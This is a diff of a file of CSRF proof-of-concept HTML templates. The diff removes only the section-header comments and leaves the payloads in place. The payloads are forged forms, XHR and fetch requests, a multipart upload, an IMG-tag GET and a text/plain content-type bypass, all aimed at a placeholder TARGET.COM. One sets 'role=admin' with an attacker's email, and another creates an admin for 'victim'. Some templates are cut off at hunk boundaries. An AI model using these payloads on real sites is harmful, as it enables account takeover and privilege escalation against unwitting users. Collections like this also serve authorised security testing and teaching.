@@ -1,8 +1,3 @@
-# ============================================================
-# CSRF — PoC HTML Templates
-# ============================================================
-
-# ---- Basic POST Form PoC ----
 <html>
 <body>
 <form id="csrf" method="POST" action="https://TARGET.COM/account/settings">
@@ -13,7 +8,6 @@
 </body>
 </html>
 
-# ---- Auto-Submit with Custom Headers ----
 <html>
 <body>
 <script>
@@ -26,7 +20,6 @@ xhr.send("role=admin&email=attacker@evil.com");
 </body>
 </html>
 
-# ---- JSON CSRF via fetch ----
 <script>
 fetch("https://TARGET.COM/api/user/update", {
     method: "POST",
@@ -36,7 +29,6 @@ fetch("https://TARGET.COM/api/user/update", {
 });
 </script>
 
-# ---- Multipart CSRF ----
 <html>
 <body>
 <form method="POST" action="https://TARGET.COM/upload" enctype="multipart/form-data">
@@ -47,10 +39,8 @@ fetch("https://TARGET.COM/api/user/update", {
 </body>
 </html>
 
-# ---- CSRF via IMG Tag (GET) ----
 <img src="https://TARGET.COM/api/admin/make?user=victim">
 
-# ---- CSRF via XMLHttpRequest text/plain bypass ----
 <script>
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://TARGET.COM/api/email/change", true);
